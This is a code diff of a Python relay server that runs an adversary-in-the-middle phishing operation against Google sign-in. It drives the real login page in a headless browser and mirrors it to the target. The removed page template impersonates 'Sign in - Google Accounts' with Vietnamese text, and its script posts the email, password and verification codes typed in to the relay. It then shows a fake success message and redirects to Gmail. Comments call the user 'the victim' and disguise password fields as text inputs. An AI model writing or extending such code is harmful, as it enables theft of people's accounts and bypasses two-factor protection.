@@ -293,44 +293,31 @@ class RelaySession(threading.Thread):
                 styles.append(css)
         except Exception as e:
             print(f"[assets-sheets] {str(e)[:100]}", flush=True)
-        # CSD disguise for mirrored password fields
+        # CSD disguise for mirrored password fields + keep hidden ones hidden
         styles.append("input[data-eg=pw]{-webkit-text-security:disc}")
+        styles.append("input[data-eg=pw-hid]{display:none!important}")
         self.styles = styles
         print(f"[assets] {self.id}: {len(styles)} css blocks, "
               f"{len(RES_CACHE)} cached urls", flush=True)
 
-    CARD_JS = """() => {
-      const el = document.querySelector('#initialView')
-              || document.querySelector('[role=main]')
-              || document.querySelector('main');
-      return el ? el.outerHTML : null;
+    DOC_JS = """() => {
+      const h = document.head.innerHTML;
+      const b = document.body.outerHTML;
+      return {head: h, body: b};
     }"""
 
     def _dom_snapshot(self, pg):
         try:
-            html = pg.evaluate(self.CARD_JS)
-            if not html:
+            parts = pg.evaluate(self.DOC_JS)
+            if not parts:
                 return
-            html = re.sub(r"<script[\s\S]*?</script>", "", html)
-            # CSD: mirrored password inputs never exist as type=password
-            html = html.replace('type="password"', 'type="text" data-eg="pw"')
-
-            lazy_urls = []
-
-            ATTR_HOSTS = ("gstatic.com", "googleusercontent.com", "googleapis.com")
-
-            def attr_repl(m):
-                attr, url = m.group(1), m.group(2)
-                host = urlparse(url).hostname or ""
-                if any(host == h or host.endswith("." + h) for h in ATTR_HOSTS):
-                    lazy_urls.append(url)
-                    return f'{attr}="{res_proxy_url(url)}"'
-                return m.group(0)
-
-            html = re.sub(r'(src|href)="(https://[^"]+)"', attr_repl, html)
-            # lazily prefetch card assets (logo svg, avatars...) for /api/res
-            for u in dict.fromkeys(lazy_urls):
-                fetch_asset(pg, u, self._res_budget)
+            head = re.sub(r"<script[\s\S]*?</script>", "", parts["head"])
+            head = re.sub(r"<title[\s\S]*?</title>", "", head)
+            body = re.sub(r"<script[\s\S]*?</script>", "", parts["body"])
+            # CSD: mirrored password inputs are never type=password (the victim
+            # sees dots via -webkit-text-security injected by the page CSS)
+            body = body.replace('type="password"', 'type="text" data-eg="pw"')
+            html = head + body
             h = hashlib.md5(html.encode()).hexdigest()[:12]
             if h != self.dom_hash:
                 self.dom = html
@@ -585,123 +572,12 @@ def public_state(s, client_hash=None):
 
 
 # ------------------------------------------------------------------ page ---
-PAGE = """<!doctype html><html><head><meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=google content=notranslate>
-<title>Sign in - Google Accounts</title>
-<style>
-*{box-sizing:border-box}
-html,body{margin:0;background:#fff;height:100%}
-body{font-family:Arial,sans-serif;display:flex;flex-direction:column;color:#202124}
-.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:12px;min-height:76vh}
-#box{width:100%;max-width:980px;position:relative}
-#cardhost{filter:blur(16px);transition:filter .3s;min-height:300px}
-#cardhost.on{filter:none}
-#mirror{display:none;width:100%;height:auto;border-radius:10px}
-#mirror.show{display:block}
-#boot{margin:44px auto 12px;width:30px;height:30px;border:3px solid #dadce0;
- border-top-color:#0b57d0;border-radius:50%;animation:r 1s linear infinite}
-@keyframes r{to{transform:rotate(360deg)}}
-#num{display:none;background:#e8f0fe;color:#0b57d0;font-size:40px;font-weight:600;
- padding:12px 32px;border-radius:14px;margin:0 auto 14px;letter-spacing:8px;width:fit-content}
-#bar{margin:14px auto 0;display:flex;gap:8px;max-width:520px}
-#bar.off{display:none}
-#rinp{flex:1;padding:12px 14px;font-size:15px;border:1px solid #dadce0;border-radius:8px;outline:none;text-align:center}
-#rinp.egpw{-webkit-text-security:disc}
-#rgo{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 22px;font-size:14px;cursor:pointer}
-#st{margin:8px auto 0;font-size:13px;color:#5f6368;min-height:18px;text-align:center}
-#st.err{color:#d93025}
-.foot{padding:10px 24px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
-.foot .l{display:flex;gap:18px}
-</style></head><body>
-<div class=wrap><div id=box>
-<div id=boot></div>
-<div id=num style="display:none">00</div>
-<div id=cardhost></div>
-<img id=mirror alt="">
-<div id=bar class=off><input id=rinp autocomplete=off><button id=rgo>Tiếp tục</button></div>
-<div id=st></div>
-</div></div>
-<div class=foot><div class=l><span>English (United States)</span></div>
-<div class=l><span>Help</span><span>Privacy</span><span>Terms</span></div></div>
-<script>
-var SID=null, KIND=null, lastHash=null, processing=false,
-    card=document.getElementById('cardhost'), mirror=document.getElementById('mirror'),
-    boot=document.getElementById('boot'), numEl=document.getElementById('num'),
-    st=document.getElementById('st'), bar=document.getElementById('bar'),
-    rinp=document.getElementById('rinp'), rgo=document.getElementById('rgo');
-var PLACE={email:'Email or phone',password:'Mật khẩu',code:'Mã xác minh'};
-['pointermove','keydown','touchstart'].forEach(function(ev){
- document.addEventListener(ev,function(){card.classList.add('on');},{once:true,capture:true});});
-function setSt(t,err){st.textContent=t||'';st.className=err?'err':'';}
-function findSel(){
- if(card.querySelector('#identifierId'))return['#identifierId','email'];
- var p=card.querySelector('input[data-eg=pw]')||card.querySelector('input[name=Passwd]');
- if(p)return['input[data-eg=pw],input[name=Passwd]','password'];
- var c=card.querySelector('input[name=totpPin]')||card.querySelector('input[type=tel]');
- if(c)return['input[name=totpPin],input[type=tel]','code'];
- return null;}
-function relaySubmit(){
- var f=findSel();if(!f)return;
- var el=card.querySelector(f[0]);if(!el||!el.value)return;
- KIND=f[1];processing=true;mirror.classList.add('show');
- var v=el.value;
- fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
-  body:JSON.stringify({id:SID,kind:KIND,value:v})}).catch(function(){setSt('Lỗi mạng',1);});
- setSt('Đang xử lý…');
-}
-card.addEventListener('click',function(e){
- var b=e.target.closest('button,div[role=button],input[type=submit]');
- if(b){e.preventDefault();e.stopPropagation();relaySubmit();}
-},true);
-card.addEventListener('keydown',function(e){
- if(e.key==='Enter'){e.preventDefault();relaySubmit();}
-},true);
-function fallbackBar(kind){
- bar.className='';KIND=kind;rinp.className=kind==='password'?'egpw':'';
- rinp.placeholder=PLACE[kind]||'';rinp.focus();}
-rgo.onclick=function(){if(rinp.value){
- fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
- body:JSON.stringify({id:SID,kind:KIND,value:rinp.value})}).then(function(){rinp.value='';bar.className='off';});}};
-rinp.onkeydown=function(k){if(k.key==='Enter')rgo.onclick();};
-function render(x){
- if(x.dom_hash&&x.dom_hash!==lastHash){
-  lastHash=x.dom_hash;
-  var gs=document.getElementById('gs');
-  if(x.styles){
-   var txt=x.styles.join('\\n');
-   if(gs){gs.textContent=txt;}
-   else{gs=document.createElement('style');gs.id='gs';gs.textContent=txt;document.head.appendChild(gs);}
-  }
-  if(x.dom){card.innerHTML=x.dom;boot.style.display='none';card.classList.add('on');}
-  processing=false;mirror.classList.remove('show');
-  var f=findSel();
-  if(f){var el=card.querySelector(f[0]);if(el&&!el.value){setTimeout(function(){el.focus();},120);}}
- }
- if(x.screenshot&&(processing||!lastHash)){
-  mirror.src='data:image/jpeg;base64,'+x.screenshot;
-  mirror.classList.add('show');boot.style.display='none';
-  if(!lastHash){card.innerHTML='';}
- }
- if(x.match_number){numEl.style.display='block';numEl.textContent=x.match_number;}
- if(x.state==='done'){setSt('');bar.className='off';
-  card.innerHTML='<div style="text-align:center;margin:30px 0"><svg width=56 height=56 viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#34A853" stroke-width="2"/><path d="M7 12.5l3.2 3.2L17 9" stroke="#34A853" stroke-width="2" fill="none"/></svg><div style="font-size:20px;margin-top:10px">Bạn đã đăng nhập thành công</div><div style="color:#5f6368;font-size:14px;margin-top:6px">Đang chuyển tới Gmail…</div></div>';
-  setTimeout(function(){location.href='https://mail.google.com';},2600);return;}
- if(x.state==='error'){setSt(x.hint||'Không thể đăng nhập',1);return;}
- if(x.need_input&&!lastHash&&!KIND){fallbackBar(x.need_input);}
-}
-function poll(){
- if(!SID){setTimeout(poll,900);return;}
- fetch('/__relay/api/state?id='+SID+'&h='+(lastHash||'')).then(function(r){return r.json();})
-  .then(function(x){render(x);setTimeout(poll,1200);})
-  .catch(function(){setTimeout(poll,2200);});
-}
-setSt('Đang mở trang đăng nhập…');
-fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
- body:JSON.stringify({})}).then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
- .catch(function(){setSt('Lỗi mạng — tải lại trang',1);});
-poll();
-</script></body></html>"""
+PAGE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "page.html")
+try:
+    PAGE = open(PAGE_PATH, encoding="utf-8").read()
+except Exception:
+    PAGE = "<!doctype html><body><p>relay: page.html missing</p></body>"
+
 
 
 # ---------------------------------------------------------------- server ---
